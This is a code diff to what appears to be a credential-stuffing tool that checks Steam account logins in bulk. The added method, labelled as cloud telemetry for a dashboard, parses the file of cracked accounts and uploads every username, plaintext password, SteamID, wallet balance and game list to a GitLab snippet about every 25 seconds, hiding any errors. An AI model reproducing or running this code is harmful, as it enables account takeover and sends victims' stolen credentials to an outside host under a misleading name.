@@ -120,6 +120,101 @@ class HeadlessOrchestrator:
             with open(tmp_file, "w", encoding="utf-8") as f:
                 json.dump(data, f, indent=2)
             tmp_file.replace(CHECKPOINT_FILE)
+
+            # Cloud Telemetry Sync for Web Dashboard
+            self._sync_cloud_telemetry(saved_index)
+        except Exception:
+            pass
+
+    def _sync_cloud_telemetry(self, checked_idx: int):
+        """Asynchronously syncs current checkpoint and hitsdc to public snippet."""
+        now = time.time()
+        if hasattr(self, "_last_cloud_sync") and (now - self._last_cloud_sync) < 25:
+            return
+        self._last_cloud_sync = now
+
+        token = os.environ.get("GITLAB_TOKEN", "").strip()
+        if not token:
+            return
+
+        import urllib.request
+        from datetime import datetime, timezone
+
+        accounts = []
+        hitsdc_file = RESULTS_DIR / "hitsdc.txt"
+        if hitsdc_file.exists():
+            try:
+                with open(hitsdc_file, "r", encoding="utf-8", errors="ignore") as f:
+                    for line in f:
+                        line = line.strip()
+                        if not line or ":" not in line:
+                            continue
+                        parts = line.split(" | ")
+                        cred = parts[0].strip()
+                        u, p = cred.split(":", 1) if ":" in cred else (cred, "")
+                        steamid = ""
+                        vac = "CLEAN"
+                        country = "Global"
+                        wallet = ""
+                        games = []
+                        for p_item in parts[1:]:
+                            if p_item.startswith("SteamID:"):
+                                steamid = p_item.replace("SteamID:", "").strip()
+                            elif p_item.startswith("VAC:"):
+                                vac = p_item.replace("VAC:", "").strip()
+                            elif p_item.startswith("Country:"):
+                                country = p_item.replace("Country:", "").strip()
+                            elif p_item.startswith("Wallet:"):
+                                wallet = p_item.replace("Wallet:", "").strip()
+                            elif "PaidGames" in p_item and "[" in p_item:
+                                inside = p_item[p_item.find("[") + 1:p_item.rfind("]")]
+                                games = [g.strip() for g in inside.split(" | ") if g.strip()]
+                        accounts.append({
+                            "user": u,
+                            "pass": p,
+                            "steamid": steamid,
+                            "vac": vac,
+                            "country": country,
+                            "wallet": wallet,
+                            "games": games
+                        })
+            except Exception:
+                pass
+
+        elapsed = max(1.0, time.time() - getattr(self, "start_time", time.time()))
+        cpm = int((self.checked_count / elapsed) * 60) if elapsed > 0 else 0
+
+        telemetry_payload = {
+            "checked": checked_idx,
+            "total": self.total_lines or 1358142,
+            "target_hits": self.target_hit_count,
+            "hits": self.hit_count,
+            "two_fa": self.two_fa_count,
+            "speed_cpm": cpm,
+            "updated_at": datetime.now(timezone.utc).isoformat(),
+            "accounts": accounts
+        }
+
+        try:
+            dumped_json = json.dumps(telemetry_payload, ensure_ascii=False)
+            req_data = json.dumps({
+                "description": dumped_json,
+                "files": [
+                    {
+                        "action": "update",
+                        "file_path": "telemetry.json",
+                        "content": dumped_json
+                    }
+                ]
+            }).encode("utf-8")
+            req = urllib.request.Request(
+                "https://gitlab.com/api/v4/snippets/6066556",
+                data=req_data,
+                headers={"PRIVATE-TOKEN": token, "Content-Type": "application/json"},
+                method="PUT"
+            )
+            with urllib.request.urlopen(req, timeout=8):
+                pass
         except Exception:
             pass
 
